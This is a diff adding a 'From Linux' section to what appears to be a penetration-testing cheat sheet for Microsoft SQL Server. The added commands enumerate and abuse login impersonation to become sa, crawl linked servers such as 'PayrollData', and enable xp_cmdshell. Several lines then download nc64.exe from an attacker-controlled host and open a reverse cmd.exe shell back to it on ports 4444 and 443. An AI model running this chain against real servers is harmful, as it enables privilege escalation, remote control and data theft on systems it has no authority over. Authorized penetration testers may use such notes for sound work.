@@ -59,3 +59,18 @@ proxychains socat TCP4-Listen:1433,fork TCP:192.168.1.199:1433
 runas /netonly /user:SQL\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 ```
 
+### From Linux
+```
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' #Check Impersonation.
+enum_impersonate #Check Impersonation.
+exec_as_login sa
+enum_links #to Crawl link SQL services
+use_link "PayrollData" 
+enable_xp_cmdshell
+xp_cmdshell whoami /priv
+xp_cmdshell "powershell -c pwd"
+xp_cmdshell “powershell -c cd C:\Users\Public; wget http://{host_ip_address}:1337/nc64.exe -outfile nc64.exe”
+xp_cmdshell “powershell -c cd C:\Users\Public; .\nc64.exe -e cmd.exe {host_ip_address}:4444”
+xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.1.176:8888/nc64.exe -o C:\Temp\nc64.exe"
+xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.1.176 443"
+```
